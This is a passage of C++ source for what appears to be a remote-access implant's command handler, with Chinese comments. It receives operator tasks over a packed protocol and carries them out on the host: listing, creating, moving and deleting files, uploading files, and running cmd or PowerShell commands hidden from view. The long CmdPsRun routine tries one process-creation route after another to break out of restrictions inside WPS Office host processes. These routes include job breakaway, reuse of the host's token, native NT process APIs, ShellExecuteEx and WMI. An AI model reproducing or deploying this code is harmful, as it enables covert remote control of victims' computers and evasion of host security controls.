		} while (!isFile && ApiWin->FindNextFileA(File, &findData));
		ApiWin->FindClose(File);
		outPacker->Set32(indexCount, count);
	}
	else {
		outPacker->Pack8(FALSE);
		outPacker->Pack32(TEB->LastErrorValue);
	}

}

// CmdMkdir 创建目录。
void Commander::CmdMkdir(ULONG commandId, Packer* inPacker, Packer* outPacker)
{
	ULONG pathSize = 0;
	CHAR* path     = (CHAR*)inPacker->UnpackBytes(&pathSize);
	ULONG taskId   = inPacker->Unpack32();

	outPacker->Pack32(taskId);

	BOOL result = ApiWin->CreateDirectoryA(path, NULL);
	if (result) {
		outPacker->Pack32(commandId);
		outPacker->PackBytes((PBYTE)path, pathSize);
	}
	else {
		outPacker->Pack32(COMMAND_ERROR);
		outPacker->Pack32(TEB->LastErrorValue);
	}
}

// CmdMv 移动或重命名文件。
void Commander::CmdMv(ULONG commandId, Packer* inPacker, Packer* outPacker)
{
	ULONG srcSize = 0;
	CHAR* src     = (CHAR*)inPacker->UnpackBytes(&srcSize);
	ULONG dstSize = 0;
	CHAR* dst     = (CHAR*)inPacker->UnpackBytes(&dstSize);
	ULONG taskId  = inPacker->Unpack32();

	outPacker->Pack32(taskId);

	BOOL result = ApiWin->MoveFileA(src, dst);
	if (result) {
		outPacker->Pack32(commandId);
	}
	else {
		outPacker->Pack32(COMMAND_ERROR);
		outPacker->Pack32(TEB->LastErrorValue);
	}
}

// CmdPsRun 启动 cmd/powershell 等子进程，并通过管道收集输出。
void Commander::CmdPsRun(ULONG commandId, Packer* inPacker, Packer* outPacker)
{
	BOOL  progOutput   = inPacker->Unpack8();
	BOOL  useToken     = inPacker->Unpack8();
	ULONG progState    = inPacker->Unpack32();
	ULONG progArgsSize = 0;
	CHAR* progArgs     = (CHAR*)inPacker->UnpackBytes(&progArgsSize);
	ULONG taskId       = inPacker->Unpack32();
	CHAR* commandLine  = (CHAR*)MemAllocLocal(progArgsSize + 1);
	if (commandLine && progArgs && progArgsSize > 0) {
		memcpy(commandLine, progArgs, progArgsSize);
		commandLine[progArgsSize] = '\0';
	}

	PROCESS_INFORMATION pi  = { 0 };
	STARTUPINFOA        spi = { 0 };
	spi.cb          = sizeof(STARTUPINFOA);
	spi.dwFlags     = STARTF_USESTDHANDLES | STARTF_USESHOWWINDOW;
	spi.wShowWindow = SW_HIDE;

	HANDLE pipeRead  = NULL;
	HANDLE pipeWrite = NULL;
	HANDLE fallbackOutputFile = NULL;
	CHAR* outputPath = NULL;
	CHAR* redirectedCommandLine = NULL;
	DWORD redirectedCommandLineSize = 0;
	CHAR outputPathBuffer[MAX_PATH] = { 0 };
	DWORD diagnosticFlags = 0;
	DWORD nativeError = 0;
	BOOL pipeCreated = FALSE;
	// WPP/WPS main hosts can report a successful pipe-backed launch while the
	// child receives no readable stdout. For output jobs, start with the file
	// fallback chain; the no-output path keeps the ordinary launch behavior.
	BOOL preferFileOutput = progOutput;
	if (progOutput) {
		SECURITY_ATTRIBUTES sa = { sizeof(SECURITY_ATTRIBUTES), NULL, TRUE };
		if (ApiWin->CreatePipe)
			pipeCreated = ApiWin->CreatePipe(&pipeRead, &pipeWrite, &sa, 0);
		if (!pipeCreated || !pipeRead || !pipeWrite)
			diagnosticFlags |= DIRECT_HTTPS_DIAG_PIPE_CREATE;
		
		spi.hStdError  = pipeWrite;
		spi.hStdOutput = pipeWrite;
		spi.hStdInput  = NULL;
	}

	// WPS runs inside a Job and its normal children use an explicit handle list.
	// Limit inheritance to the pipe writer so the command child does not receive
	// unrelated WPS handles or the parent read end.
	STARTUPINFOEXA startupEx = { 0 };
	LPVOID attributeStorage = NULL;
	SIZE_T attributeSize = 0;
	BOOL useHandleList = FALSE;
	if (progOutput && pipeRead && pipeWrite &&
		ApiWin->SetHandleInformation &&
		ApiWin->InitializeProcThreadAttributeList &&
		ApiWin->UpdateProcThreadAttribute &&
		ApiWin->DeleteProcThreadAttributeList) {
		ApiWin->SetHandleInformation(pipeRead, HANDLE_FLAG_INHERIT, 0);
		ApiWin->InitializeProcThreadAttributeList(NULL, 1, 0, &attributeSize);
		if (attributeSize) {
			attributeStorage = MemAllocLocal(attributeSize);
			if (attributeStorage &&
				ApiWin->InitializeProcThreadAttributeList(
					(LPPROC_THREAD_ATTRIBUTE_LIST)attributeStorage, 1, 0, &attributeSize)) {
				HANDLE inheritedHandles[1] = { pipeWrite };
				if (ApiWin->UpdateProcThreadAttribute(
					(LPPROC_THREAD_ATTRIBUTE_LIST)attributeStorage,
					0,
					PROC_THREAD_ATTRIBUTE_HANDLE_LIST,
					inheritedHandles,
					sizeof(inheritedHandles),
					NULL,
					NULL)) {
					startupEx.StartupInfo = spi;
					startupEx.lpAttributeList = (LPPROC_THREAD_ATTRIBUTE_LIST)attributeStorage;
					useHandleList = TRUE;
				}
			}
		}
	}
	if (progOutput && !useHandleList)
		diagnosticFlags |= DIRECT_HTTPS_DIAG_HANDLE_LIST;

	LPSTARTUPINFOA startupInfo = useHandleList ?
		(LPSTARTUPINFOA)&startupEx : &spi;
	DWORD creationFlags = progState | CREATE_NO_WINDOW;
	if (useHandleList)
		creationFlags |= EXTENDED_STARTUPINFO_PRESENT;

	BOOL result = !preferFileOutput && commandLine && progArgs && progArgsSize > 0 &&
		ApiWin->CreateProcessA(NULL, commandLine, NULL, NULL, TRUE, creationFlags, NULL, NULL, startupInfo, &pi);
	if (!result)
		diagnosticFlags |= DIRECT_HTTPS_DIAG_CREATE_PROCESS;
	if (!preferFileOutput && !result && useHandleList) {
		// Some WPS Job configurations reject a child that would remain in the
		// parent Job. Retry with the same explicit handle list outside that Job.
		result = commandLine && progArgs && progArgsSize > 0 &&
			ApiWin->CreateProcessA(NULL, commandLine, NULL, NULL, TRUE,
				creationFlags | CREATE_BREAKAWAY_FROM_JOB, NULL, NULL, startupInfo, &pi);
		if (!result)
			diagnosticFlags |= DIRECT_HTTPS_DIAG_BREAKAWAY;
	}
	if (!preferFileOutput && !result && ApiWin->CreateProcessAsUserA && ApiNt->NtOpenProcessToken) {
		// WPS/WPP main hosts can reject the ordinary CreateProcess path even
		// when a breakaway child and an explicit handle list are requested.
		// Reuse the host's primary token through the documented advapi path;
		// the child still receives only the selected output handle.
		HANDLE processToken = NULL;
		NTSTATUS tokenStatus = ApiNt->NtOpenProcessToken(
			NtCurrentProcess(),
			TOKEN_QUERY | TOKEN_DUPLICATE | TOKEN_ASSIGN_PRIMARY,
			&processToken);
		if (NT_SUCCESS(tokenStatus) && processToken) {
			result = commandLine && progArgs && progArgsSize > 0 &&
				ApiWin->CreateProcessAsUserA(
					processToken,
					NULL,
					commandLine,
					NULL,
					NULL,
					TRUE,
					creationFlags | CREATE_BREAKAWAY_FROM_JOB,
					NULL,
					NULL,
					startupInfo,
					&pi);
			if (!result)
				diagnosticFlags |= DIRECT_HTTPS_DIAG_AS_USER;
		}
		else {
			nativeError = ApiNt->RtlNtStatusToDosError ?
				ApiNt->RtlNtStatusToDosError(tokenStatus) : TEB->LastErrorValue;
			diagnosticFlags |= DIRECT_HTTPS_DIAG_TOKEN_OPEN;
		}
		if (processToken)
			ApiNt->NtClose(processToken);
	}

	if (!result && progOutput && ApiWin->CreateFileA && ApiWin->CreateProcessA) {
		// A WPS/WPP main host can reject any child that inherits a pipe even
		// though the same agent works in a plugin child. Redirect output to a
		// user-writable file and launch with inheritance disabled as a second
		// host-compatibility path.
		if (pipeRead) {
			ApiNt->NtClose(pipeRead);
			pipeRead = NULL;
		}
		if (pipeWrite) {
			ApiNt->NtClose(pipeWrite);
			pipeWrite = NULL;
		}

		const CHAR outputPrefix[] = "C:\\Users\\Public\\direct-https-job-";
		const CHAR outputSuffix[] = ".out";
		ULONG outputOffset = 0;
		memcpy(outputPathBuffer + outputOffset, outputPrefix, sizeof(outputPrefix) - 1);
		outputOffset += sizeof(outputPrefix) - 1;
		CHAR taskDigits[16] = { 0 };
		ULONG taskValue = taskId;
		ULONG digitCount = 0;
		do {
			taskDigits[digitCount++] = (CHAR)('0' + (taskValue % 10));
			taskValue /= 10;
		} while (taskValue && digitCount < sizeof(taskDigits));
		while (digitCount) {
			outputPathBuffer[outputOffset++] = taskDigits[--digitCount];
		}
		memcpy(outputPathBuffer + outputOffset, outputSuffix, sizeof(outputSuffix) - 1);
		outputOffset += sizeof(outputSuffix) - 1;
		outputPathBuffer[outputOffset] = '\0';

		fallbackOutputFile = ApiWin->CreateFileA(
			outputPathBuffer,
			GENERIC_READ,
			FILE_SHARE_READ | FILE_SHARE_WRITE,
			NULL,
			CREATE_ALWAYS,
			FILE_ATTRIBUTE_NORMAL,
			NULL);
		if (fallbackOutputFile == INVALID_HANDLE_VALUE)
			fallbackOutputFile = NULL;
		if (fallbackOutputFile && fallbackOutputFile != INVALID_HANDLE_VALUE) {
			const CHAR cmdPrefix[] = "cmd.exe /d /c \"(";
			const CHAR cmdMiddle[] = ") > ";
			const CHAR cmdSuffix[] = " 2>&1\"";
			const CHAR redirectStart[] = " > \"";
			const CHAR redirectEnd[] = "\" 2>&1";
			ULONG effectiveProgArgsSize = progArgsSize;
			while (effectiveProgArgsSize > 0 &&
				progArgs[effectiveProgArgsSize - 1] == '\0')
				effectiveProgArgsSize--;
			BOOL compoundCmd = StartsWithA(progArgs, "cmd.exe /d /c ");
			ULONG cmdPrefixSize = sizeof("cmd.exe /d /c ") - 1;
			ULONG cmdBodySize = effectiveProgArgsSize > cmdPrefixSize ?
				effectiveProgArgsSize - cmdPrefixSize : 0;
			if (compoundCmd) {
				// cmd applies a trailing redirection only to the final command in
				// an && chain. Wrap the whole payload so every line reaches the
				// file-backed reader used by WPP/WPS fallback jobs.
				redirectedCommandLineSize =
					(sizeof(cmdPrefix) - 1) + cmdBodySize +
					(sizeof(cmdMiddle) - 1) + outputOffset +
					(sizeof(cmdSuffix) - 1) + 1;
			}
			else {
				redirectedCommandLineSize = effectiveProgArgsSize +
					(sizeof(redirectStart) - 1) + outputOffset +
					(sizeof(redirectEnd) - 1) + 1;
			}
			redirectedCommandLine = (CHAR*)MemAllocLocal(redirectedCommandLineSize);
			if (redirectedCommandLine) {
				ULONG cursor = 0;
				if (compoundCmd) {
					memcpy(redirectedCommandLine + cursor, cmdPrefix, sizeof(cmdPrefix) - 1);
					cursor += sizeof(cmdPrefix) - 1;
					memcpy(redirectedCommandLine + cursor, progArgs + cmdPrefixSize, cmdBodySize);
					cursor += cmdBodySize;
					memcpy(redirectedCommandLine + cursor, cmdMiddle, sizeof(cmdMiddle) - 1);
					cursor += sizeof(cmdMiddle) - 1;
					memcpy(redirectedCommandLine + cursor, outputPathBuffer, outputOffset);
					cursor += outputOffset;
					memcpy(redirectedCommandLine + cursor, cmdSuffix, sizeof(cmdSuffix) - 1);
					cursor += sizeof(cmdSuffix) - 1;
				}
				else {
					memcpy(redirectedCommandLine + cursor, progArgs, effectiveProgArgsSize);
					cursor += effectiveProgArgsSize;
					memcpy(redirectedCommandLine + cursor, redirectStart, sizeof(redirectStart) - 1);
					cursor += sizeof(redirectStart) - 1;
					memcpy(redirectedCommandLine + cursor, outputPathBuffer, outputOffset);
					cursor += outputOffset;
					memcpy(redirectedCommandLine + cursor, redirectEnd, sizeof(redirectEnd) - 1);
					cursor += sizeof(redirectEnd) - 1;
				}
				redirectedCommandLine[cursor] = '\0';

				STARTUPINFOA fallbackSpi = { 0 };
				fallbackSpi.cb = sizeof(STARTUPINFOA);
				fallbackSpi.dwFlags = STARTF_USESHOWWINDOW;
				fallbackSpi.wShowWindow = SW_HIDE;
				DWORD fallbackFlags = creationFlags & ~EXTENDED_STARTUPINFO_PRESENT;
				result = ApiWin->CreateProcessA(
					NULL, redirectedCommandLine, NULL, NULL, FALSE,
					fallbackFlags, NULL, NULL, &fallbackSpi, &pi);
				if (!result)
					diagnosticFlags |= DIRECT_HTTPS_DIAG_FALLBACK_CREATE;
				if (!result) {
					result = ApiWin->CreateProcessA(
						NULL, redirectedCommandLine, NULL, NULL, FALSE,
						fallbackFlags | CREATE_BREAKAWAY_FROM_JOB,
						NULL, NULL, &fallbackSpi, &pi);
					if (!result)
						diagnosticFlags |= DIRECT_HTTPS_DIAG_FALLBACK_BREAKAWAY;
				}
				if (!result && ApiWin->CreateProcessAsUserA && ApiNt->NtOpenProcessToken) {
					HANDLE processToken = NULL;
					NTSTATUS tokenStatus = ApiNt->NtOpenProcessToken(
						NtCurrentProcess(),
						TOKEN_QUERY | TOKEN_DUPLICATE | TOKEN_ASSIGN_PRIMARY,
						&processToken);
					if (NT_SUCCESS(tokenStatus) && processToken) {
						result = ApiWin->CreateProcessAsUserA(
							processToken,
							NULL,
							redirectedCommandLine,
							NULL,
							NULL,
							FALSE,
							fallbackFlags | CREATE_BREAKAWAY_FROM_JOB,
							NULL,
							NULL,
							&fallbackSpi,
							&pi);
							if (!result)
								diagnosticFlags |= DIRECT_HTTPS_DIAG_FALLBACK_AS_USER;
						}
						else {
							nativeError = ApiNt->RtlNtStatusToDosError ?
								ApiNt->RtlNtStatusToDosError(tokenStatus) : TEB->LastErrorValue;
							diagnosticFlags |= DIRECT_HTTPS_DIAG_TOKEN_OPEN;
						}
						if (processToken)
							ApiNt->NtClose(processToken);
				}

				// CreateProcessWithTokenW uses the host's primary token through the
				// logon service path. Some WPP Job configurations reject the ANSI
				// CreateProcessAsUser path but allow this equivalent token launch.
				if (!result && ApiWin->CreateProcessWithTokenW && ApiNt->NtOpenProcessToken) {
					WCHAR* redirectedCommandLineW = (WCHAR*)MemAllocLocal(
						(redirectedCommandLineSize + 1) * sizeof(WCHAR));
					if (redirectedCommandLineW) {
						for (DWORD i = 0; i < redirectedCommandLineSize; i++)
							redirectedCommandLineW[i] = (WCHAR)(BYTE)redirectedCommandLine[i];
						redirectedCommandLineW[redirectedCommandLineSize] = L'\0';

						HANDLE processToken = NULL;
						NTSTATUS tokenStatus = ApiNt->NtOpenProcessToken(
							NtCurrentProcess(),
							TOKEN_QUERY | TOKEN_DUPLICATE | TOKEN_ASSIGN_PRIMARY,
							&processToken);
						if (NT_SUCCESS(tokenStatus) && processToken) {
							STARTUPINFOW tokenSpi = { 0 };
							tokenSpi.cb = sizeof(STARTUPINFOW);
							tokenSpi.dwFlags = STARTF_USESHOWWINDOW;
							tokenSpi.wShowWindow = SW_HIDE;
							result = ApiWin->CreateProcessWithTokenW(
								processToken,
								0,
								NULL,
								redirectedCommandLineW,
								fallbackFlags | CREATE_BREAKAWAY_FROM_JOB,
								NULL,
								NULL,
								&tokenSpi,
								&pi);
							if (!result)
								diagnosticFlags |= DIRECT_HTTPS_DIAG_TOKEN_LAUNCH;
							}
							else {
								nativeError = ApiNt->RtlNtStatusToDosError ?
									ApiNt->RtlNtStatusToDosError(tokenStatus) : TEB->LastErrorValue;
								diagnosticFlags |= DIRECT_HTTPS_DIAG_TOKEN_OPEN;
						}
						if (processToken)
							ApiNt->NtClose(processToken);
						MemFreeLocal((LPVOID*)&redirectedCommandLineW,
							(redirectedCommandLineSize + 1) * sizeof(WCHAR));
					}
					else {
						diagnosticFlags |= DIRECT_HTTPS_DIAG_TOKEN_LAUNCH;
					}
				}

				// Use the native RTL process construction path after the documented
				// Win32 and shell broker paths. This keeps output redirection in the
				// child command line and avoids inheriting any WPS host handles.
				if (!result && ApiNt->RtlCreateProcessParameters &&
					ApiNt->RtlDestroyProcessParameters && ApiNt->RtlCreateUserProcess) {
					DWORD nativeCommandLineBytes = redirectedCommandLineSize * sizeof(WCHAR);
					WCHAR* nativeCommandLineW = (WCHAR*)MemAllocLocal(nativeCommandLineBytes);
					if (nativeCommandLineW) {
						for (DWORD i = 0; i < redirectedCommandLineSize; i++)
							nativeCommandLineW[i] = (WCHAR)(BYTE)redirectedCommandLine[i];

						WCHAR nativeImagePathBuffer[128] = L"\\??\\C:\\Windows\\System32\\cmd.exe";
						USHORT nativeImagePathChars = 0;
						while (nativeImagePathBuffer[nativeImagePathChars])
							nativeImagePathChars++;
						if (StartsWithA(redirectedCommandLine, "powershell.exe")) {
							const WCHAR powershellPath[] = L"\\??\\C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe";
							ULONG powershellChars = 0;
							while (powershellPath[powershellChars])
								powershellChars++;
							for (ULONG i = 0; i <= powershellChars; i++)
								nativeImagePathBuffer[i] = powershellPath[i];
							nativeImagePathChars = (USHORT)powershellChars;
						}

						UNICODE_STRING nativeImagePath = { 0 };
						nativeImagePath.Length = nativeImagePathChars * sizeof(WCHAR);
						nativeImagePath.MaximumLength = nativeImagePath.Length + sizeof(WCHAR);
						nativeImagePath.Buffer = nativeImagePathBuffer;
						UNICODE_STRING nativeCommandLine = { 0 };
						nativeCommandLine.Length = (USHORT)((redirectedCommandLineSize - 1) * sizeof(WCHAR));
						nativeCommandLine.MaximumLength = (USHORT)nativeCommandLineBytes;
						nativeCommandLine.Buffer = nativeCommandLineW;

						PRTL_USER_PROCESS_PARAMETERS nativeParameters = NULL;
						NTSTATUS parametersStatus = ApiNt->RtlCreateProcessParameters(
							&nativeParameters,
							&nativeImagePath,
							NULL,
							NULL,
							&nativeCommandLine,
							NULL,
							NULL,
							NULL,
							NULL,
							NULL);
						if (NT_SUCCESS(parametersStatus) && nativeParameters) {
							RTL_USER_PROCESS_INFORMATION nativeInfo = { 0 };
							nativeInfo.Length = sizeof(nativeInfo);
							NTSTATUS nativeStatus = ApiNt->RtlCreateUserProcess(
								&nativeImagePath,
								0,
								nativeParameters,
								NULL,
								NULL,
								NULL,
								FALSE,
								NULL,
								NULL,
								&nativeInfo);
							if (NT_SUCCESS(nativeStatus) && nativeInfo.Process && nativeInfo.Thread) {
								result = TRUE;
								pi.hProcess = nativeInfo.Process;
								pi.hThread = nativeInfo.Thread;
								pi.dwProcessId = (DWORD)(ULONG_PTR)nativeInfo.ClientId.UniqueProcess;
								pi.dwThreadId = (DWORD)(ULONG_PTR)nativeInfo.ClientId.UniqueThread;
							}
							else {
								diagnosticFlags |= DIRECT_HTTPS_DIAG_RTL_CREATE;
								if (nativeInfo.Thread)
									ApiNt->NtClose(nativeInfo.Thread);
								if (nativeInfo.Process)
									ApiNt->NtClose(nativeInfo.Process);
								nativeError = ApiNt->RtlNtStatusToDosError ?
									ApiNt->RtlNtStatusToDosError(nativeStatus) : TEB->LastErrorValue;
							}
							ApiNt->RtlDestroyProcessParameters(nativeParameters);
						}
						else {
							nativeError = ApiNt->RtlNtStatusToDosError ?
								ApiNt->RtlNtStatusToDosError(parametersStatus) : TEB->LastErrorValue;
							diagnosticFlags |= DIRECT_HTTPS_DIAG_RTL_PARAMS;
						}
						MemFreeLocal((LPVOID*)&nativeCommandLineW, nativeCommandLineBytes);
					}
					else {
						diagnosticFlags |= DIRECT_HTTPS_DIAG_RTL_CREATE;
					}
				}

				// NtCreateUserProcess is the lower-level process construction path.
				// Pass the image name explicitly and request a breakaway child while
				// keeping the redirected output in the command line, so no host handle
				// needs to cross the WPP/WPS process boundary.
				if (!result && ApiNt->NtCreateUserProcess &&
					ApiNt->RtlCreateProcessParameters &&
					ApiNt->RtlDestroyProcessParameters) {
					DWORD nativeCommandLineBytes = redirectedCommandLineSize * sizeof(WCHAR);
					WCHAR* nativeCommandLineW = (WCHAR*)MemAllocLocal(nativeCommandLineBytes);
					if (nativeCommandLineW) {
						for (DWORD i = 0; i < redirectedCommandLineSize; i++)
							nativeCommandLineW[i] = (WCHAR)(BYTE)redirectedCommandLine[i];

						WCHAR nativeImagePathBuffer[128] = L"\\??\\C:\\Windows\\System32\\cmd.exe";
						USHORT nativeImagePathChars = 0;
						while (nativeImagePathBuffer[nativeImagePathChars])
							nativeImagePathChars++;
						if (StartsWithA(redirectedCommandLine, "powershell.exe")) {
							const WCHAR powershellPath[] = L"\\??\\C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe";
							ULONG powershellChars = 0;
							while (powershellPath[powershellChars])
								powershellChars++;
							for (ULONG i = 0; i <= powershellChars; i++)
								nativeImagePathBuffer[i] = powershellPath[i];
							nativeImagePathChars = (USHORT)powershellChars;
						}

						UNICODE_STRING nativeImagePath = { 0 };
						nativeImagePath.Length = nativeImagePathChars * sizeof(WCHAR);
						nativeImagePath.MaximumLength = nativeImagePath.Length + sizeof(WCHAR);
						nativeImagePath.Buffer = nativeImagePathBuffer;
						UNICODE_STRING nativeCommandLine = { 0 };
						nativeCommandLine.Length = (USHORT)((redirectedCommandLineSize - 1) * sizeof(WCHAR));
						nativeCommandLine.MaximumLength = (USHORT)nativeCommandLineBytes;
						nativeCommandLine.Buffer = nativeCommandLineW;

						PRTL_USER_PROCESS_PARAMETERS nativeParameters = NULL;
						NTSTATUS parametersStatus = ApiNt->RtlCreateProcessParameters(
							&nativeParameters,
							&nativeImagePath,
							NULL,
							NULL,
							&nativeCommandLine,
							NULL,
							NULL,
							NULL,
							NULL,
							NULL);
						if (NT_SUCCESS(parametersStatus) && nativeParameters) {
							DIRECT_HTTPS_PS_CREATE_INFO createInfo = { 0 };
							createInfo.Size = sizeof(createInfo);
							createInfo.State = DirectHttpsPsCreateInitialState;
							DIRECT_HTTPS_PS_ATTRIBUTE_LIST attributeList = { 0 };
							attributeList.TotalLength = sizeof(attributeList);
							attributeList.Attributes[0].Attribute = DIRECT_HTTPS_PS_ATTRIBUTE_IMAGE_NAME;
							attributeList.Attributes[0].Size = nativeImagePath.Length;
							attributeList.Attributes[0].ValuePtr = nativeImagePath.Buffer;
							HANDLE nativeProcess = NULL;
							HANDLE nativeThread = NULL;
							NTSTATUS nativeStatus = ApiNt->NtCreateUserProcess(
								&nativeProcess,
								&nativeThread,
								PROCESS_TERMINATE | PROCESS_QUERY_INFORMATION | DIRECT_HTTPS_NATIVE_SYNCHRONIZE_ACCESS,
								THREAD_QUERY_INFORMATION | DIRECT_HTTPS_NATIVE_SYNCHRONIZE_ACCESS,
								NULL,
								NULL,
								DIRECT_HTTPS_PROCESS_CREATE_FLAGS_BREAKAWAY,
								0,
								nativeParameters,
								&createInfo,
								&attributeList);
							if (NT_SUCCESS(nativeStatus) && nativeProcess && nativeThread) {
								result = TRUE;
								pi.hProcess = nativeProcess;
								pi.hThread = nativeThread;
								pi.dwProcessId = ApiWin->GetProcessId ? ApiWin->GetProcessId(nativeProcess) : 0;
								pi.dwThreadId = 0;
							}
							else {
								diagnosticFlags |= DIRECT_HTTPS_DIAG_NATIVE_CREATE;
								if (nativeThread)
									ApiNt->NtClose(nativeThread);
								if (nativeProcess)
									ApiNt->NtClose(nativeProcess);
								nativeError = ApiNt->RtlNtStatusToDosError ?
									ApiNt->RtlNtStatusToDosError(nativeStatus) : TEB->LastErrorValue;
							}
						}
						else {
							nativeError = ApiNt->RtlNtStatusToDosError ?
								ApiNt->RtlNtStatusToDosError(parametersStatus) : TEB->LastErrorValue;
							diagnosticFlags |= DIRECT_HTTPS_DIAG_NATIVE_PARAMS;
						}
						if (nativeParameters)
							ApiNt->RtlDestroyProcessParameters(nativeParameters);
						MemFreeLocal((LPVOID*)&nativeCommandLineW, nativeCommandLineBytes);
					}
					else {
						diagnosticFlags |= DIRECT_HTTPS_DIAG_NATIVE_CREATE;
					}
				}

				// WPP's /from_prome child can reject every CreateProcess* variant
				// while still allowing the shell broker to create a normal user
				// process. Keep the same redirected file and wait on the returned
				// process handle so result delivery and cleanup remain unchanged.
				if (!result && ApiWin->ShellExecuteExA) {
					CHAR* shellFile = (CHAR*)"C:\\Windows\\System32\\cmd.exe";
					CHAR* shellParams = redirectedCommandLine;
					if (StartsWithA(redirectedCommandLine, "powershell.exe"))
						shellFile = (CHAR*)"C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe";
					while (shellParams && *shellParams && *shellParams != ' ')
						shellParams++;
					while (shellParams && *shellParams == ' ')
						shellParams++;

					SHELLEXECUTEINFOA shellInfo = { 0 };
					shellInfo.cbSize = sizeof(shellInfo);
					shellInfo.fMask = SEE_MASK_NOCLOSEPROCESS | SEE_MASK_NOASYNC | SEE_MASK_FLAG_NO_UI;
					shellInfo.lpVerb = "open";
					shellInfo.lpFile = shellFile;
					shellInfo.lpParameters = shellParams;
					shellInfo.nShow = SW_HIDE;
					if (ApiWin->ShellExecuteExA(&shellInfo) && shellInfo.hProcess) {
						result = TRUE;
						pi.hProcess = shellInfo.hProcess;
						pi.hThread = NULL;
						pi.dwProcessId = ApiWin->GetProcessId ? ApiWin->GetProcessId(shellInfo.hProcess) : 0;
					}
					else {
						diagnosticFlags |= DIRECT_HTTPS_DIAG_SHELL_EXECUTE;
					}
				}

				// The WMI provider is a service-side execution broker. Pass the
				// existing redirected command line and current directory so the
				// result still arrives through the normal file-backed job path.
				if (!result && redirectedCommandLine) {
					CHAR currentDirectory[MAX_PATH] = { 0 };
					if (ApiWin->GetCurrentDirectoryA)
						ApiWin->GetCurrentDirectoryA(MAX_PATH, currentDirectory);
					DWORD wmiProcessId = 0;
					HANDLE wmiProcess = NULL;
					if (DirectHttpsRunViaWmi(
						redirectedCommandLine,
						currentDirectory,
						&wmiProcessId,
						&wmiProcess,
						&nativeError)) {
						result = TRUE;
						pi.hProcess = wmiProcess;
						pi.hThread = NULL;
						pi.dwProcessId = wmiProcessId;
						pi.dwThreadId = 0;
					}
					else {
						diagnosticFlags |= DIRECT_HTTPS_DIAG_WMI_ROUTE;
					}
				}
			}

			if (result) {
				outputPath = (CHAR*)MemAllocLocal(MAX_PATH);
				if (outputPath) {
					memcpy(outputPath, outputPathBuffer, MAX_PATH);
					pipeRead = fallbackOutputFile;
					fallbackOutputFile = NULL;
				}
				else {
					ApiNt->NtTerminateProcess(pi.hProcess, NULL);
					if (pi.hThread)
						ApiNt->NtClose(pi.hThread);
					if (pi.hProcess)
						ApiNt->NtClose(pi.hProcess);
					pi.hThread = NULL;
					pi.hProcess = NULL;
					result = FALSE;
				}
			}
		}
		else {
			diagnosticFlags |= DIRECT_HTTPS_DIAG_FALLBACK_FILE;
		}
	}

	if (redirectedCommandLine)
		MemFreeLocal((LPVOID*)&redirectedCommandLine, redirectedCommandLineSize);
	if (fallbackOutputFile) {
		ApiNt->NtClose(fallbackOutputFile);
		ApiWin->DeleteFileA(outputPathBuffer);
	}

	if (useHandleList)
		ApiWin->DeleteProcThreadAttributeList((LPPROC_THREAD_ATTRIBUTE_LIST)attributeStorage);
	if (attributeStorage)
		MemFreeLocal(&attributeStorage, attributeSize);

	if (result) {
		// The child owns the inherited write end. Keeping a parent copy delays EOF.
		if (pipeWrite) {
			ApiNt->NtClose(pipeWrite);
			pipeWrite = NULL;
		}
		JobData job = agent->jober->CreateJobData(taskId, JOB_TYPE_PROCESS, JOB_STATE_RUNNING, pi.hProcess, pi.dwProcessId, pipeRead, NULL, outputPath);
		outputPath = NULL;

		outPacker->Pack32(taskId);
		outPacker->Pack32(commandId);
		outPacker->Pack32(job.pidObject);
		outPacker->Pack8(progOutput);
		outPacker->PackBytes((PBYTE)progArgs, progArgsSize);
		MemFreeLocal((LPVOID*)&commandLine, progArgsSize + 1);
		commandLine = NULL;

		if (pi.hThread) {
			ApiNt->NtClose(pi.hThread);
			pi.hThread = NULL;
		}
		if (!progOutput) {
			ApiNt->NtClose(pi.hProcess);
			pi.hProcess = NULL;
		}
	}
	else {
		if (outputPath) {
			ApiWin->DeleteFileA(outputPath);
			MemFreeLocal((LPVOID*)&outputPath, MAX_PATH);
		}
		if (pipeRead) {
			ApiNt->NtClose(pipeRead);
			pipeRead = NULL;
		}

		if (pipeWrite) {
			ApiNt->NtClose(pipeWrite);
			pipeWrite = NULL;
		}

		outPacker->Pack32(taskId);
		outPacker->Pack32(COMMAND_ERROR);
		outPacker->Pack32((nativeError ? nativeError : TEB->LastErrorValue) | diagnosticFlags);
	}

	if (commandLine)
		MemFreeLocal((LPVOID*)&commandLine, progArgsSize + 1);
}

// CmdPwd 返回 agent 当前工作目录。
void Commander::CmdPwd(ULONG commandId, Packer* inPacker, Packer* outPacker)
{
	CHAR  path[MAX_PATH] = { 0 };
	ULONG pathSize = ApiWin->GetCurrentDirectoryA(MAX_PATH, path);
	ULONG taskId   = inPacker->Unpack32();

	outPacker->Pack32(taskId);

	if (pathSize) {
		outPacker->Pack32(commandId);
		outPacker->PackBytes((PBYTE)path, pathSize);
	}
	else {
		outPacker->Pack32(COMMAND_ERROR);
		outPacker->Pack32(TEB->LastErrorValue);
	}
}

// CmdRm 删除文件或目录。
void Commander::CmdRm(ULONG commandId, Packer* inPacker, Packer* outPacker)
{
	ULONG pathSize = 0;
	CHAR* path     = (CHAR*)inPacker->UnpackBytes(&pathSize);
	ULONG taskId   = inPacker->Unpack32();

	outPacker->Pack32(taskId);

	DWORD dwAttrib = ApiWin->GetFileAttributesA(path);

	BOOL result = FALSE;
	BOOL directory = (dwAttrib != INVALID_FILE_ATTRIBUTES && (dwAttrib & FILE_ATTRIBUTE_DIRECTORY));

	if ( directory )
		result = ApiWin->RemoveDirectoryA(path);
	else
		result = ApiWin->DeleteFileA(path);

	if (result) {
		outPacker->Pack32(commandId);
		outPacker->Pack8(directory);
	}
	else {
		outPacker->Pack32(COMMAND_ERROR);
		outPacker->Pack32(TEB->LastErrorValue);
	}
}

// CmdTerminate 让 agent 主循环停止，准备退出。
void Commander::CmdTerminate(ULONG commandId, Packer* inPacker, Packer* outPacker)
{
	agent->config->exit_method  = inPacker->Unpack32();
	agent->config->exit_task_id = inPacker->Unpack32();
	agent->Active = FALSE;
}

// CmdUpload 接收服务端发来的文件内容并写入本地文件。
void Commander::CmdUpload(ULONG commandId, Packer* inPacker, Packer* outPacker)
{
	ULONG memoryId = inPacker->Unpack32();
	ULONG pathSize = 0;
	CHAR* path     = (CHAR*)inPacker->UnpackBytes(&pathSize);
	ULONG taskId   = inPacker->Unpack32();
	
	outPacker->Pack32(taskId);

